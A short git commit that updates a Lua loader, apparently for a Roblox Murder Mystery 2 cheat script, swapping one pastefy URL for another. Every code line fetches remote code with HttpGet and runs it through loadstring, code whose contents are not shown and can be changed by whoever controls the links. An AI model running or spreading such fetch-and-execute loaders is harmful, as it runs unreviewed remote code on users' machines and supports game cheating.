70d07930676838f4300bf20d57a0092339ce3a07
mm2script-server1 <ashioargentinaacc@gmail.com>
2026-01-20 12:04:41 +0800

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,3 +1,3 @@
-loadstring(game:HttpGet("https://pastefy.app/Z7AES6jG/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/Oo3ZY8Vt/raw"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua"))()
